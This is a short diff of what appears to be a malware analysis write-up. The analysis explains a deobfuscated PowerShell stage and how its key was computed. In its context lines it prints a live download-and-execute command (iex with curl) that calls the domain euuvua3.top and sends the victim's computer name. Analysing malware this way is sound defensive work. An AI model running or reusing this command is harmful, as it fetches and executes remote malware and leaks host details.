@@ -73,7 +73,9 @@ iex(curl -useb "http://euuvua3.top/2.php?id=$env:computername&key=$cvjqdh")
 ```
 
 We get the domain for the second stage payload: "euuvua3[.]top" as well as some URL arguments, the first is the hostname of the endpoint: "id=$env:computername".
+
 The second is a key, which is defined in the output of the deobfuscated script: "key=$cvjqdh"
+
 "$cvjqdh+= ((1606018388+(7651-(7076855/(-2573+3790))))-((2439-6080)+((225058853925/(10120-4281))/(-3123+7926))))"
 
 We can then use PowerShell again to define and call this variable to get the key value: "1606015840"
